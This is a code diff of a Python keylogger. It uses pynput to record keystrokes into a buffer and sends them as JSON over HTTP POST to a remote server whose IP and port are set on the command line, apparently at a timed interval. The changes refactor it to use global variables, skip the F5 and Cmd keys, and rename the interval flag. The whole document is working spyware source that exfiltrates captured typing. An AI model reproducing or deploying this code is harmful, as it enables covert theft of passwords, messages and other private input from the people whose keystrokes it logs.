@@ -4,7 +4,11 @@ import json
 import threading
 import optparse
 
-def post_request(ip, port, interval=None):
+def post_request():
+    global ip
+    global port
+    global interval
+
     try:
         payload = json.dumps({"keyboardData": text})
         r = requests.post(f"http://{ip}:{port}", data=payload,
@@ -31,6 +35,10 @@ def key_down(key):
         pass
     elif key == keyboard.Key.shift:
         pass
+    elif key == keyboard.Key.f5:
+        pass
+    elif key == keyboard.Key.cmd:
+        pass
     elif key == keyboard.Key.esc:
         return False
     else:
@@ -38,24 +46,24 @@ def key_down(key):
 
 
 def main():
+    with keyboard.Listener(on_press=key_down) as listener:
+        post_request()
+        listener.join()
+
+if __name__ == '__main__':
+    text = ""
     parser = optparse.OptionParser("Usage: program.py -i <ip address> -p <port>")
     parser.add_option('-i', dest='ip', type='string', help='Set the remote server IP')
     parser.add_option('-p', dest='port', type='string', help='Set the remote server port.')
-    parser.add_option('--interval', dest='interval', type='string', help='Time interval between each thread. Default is 10 seconds.', default='10')
+    parser.add_option('-t', dest='interval', type='string', help='Time interval between each thread. Default is 10 seconds.', default='10')
     (options, args) = parser.parse_args()
 
     ip = options.ip
     port = options.port
     interval = int(options.interval)
-
+    
     if ip == None or port == None:
         print(parser.usage)
         exit(0)
 
-    with keyboard.Listener(on_press=key_down) as listener:
-        post_request(ip, port, interval=interval)
-        listener.join()
-
-if __name__ == '__main__':
-    text = ""
     main()
